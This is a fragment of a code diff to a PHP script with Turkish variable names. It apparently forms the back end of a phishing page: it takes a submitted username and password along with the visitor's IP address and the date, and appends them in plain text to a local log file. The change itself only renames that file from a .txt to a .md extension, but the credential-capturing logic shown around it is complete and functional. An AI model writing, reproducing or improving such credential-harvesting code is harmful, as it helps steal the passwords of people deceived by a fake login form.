@@ -7,7 +7,7 @@ $sifre = $_POST['Password'];
 $ip =$_SERVER["REMOTE_ADDR"];
 $tarih = date('d.m.Y - H:i');
 
-$dosya = fopen ("bilgiler.txt" , 'a'); 
+$dosya = fopen ("bilgiler.md" , 'a'); 
 $yaz="Date: ".$tarih."\nUsername:  ". $kullaniciadi . "   Password: " .$sifre."   IP: ".$ip."\n\n";
 fwrite ( $dosya , $yaz ) ;
 fclose ($dosya);
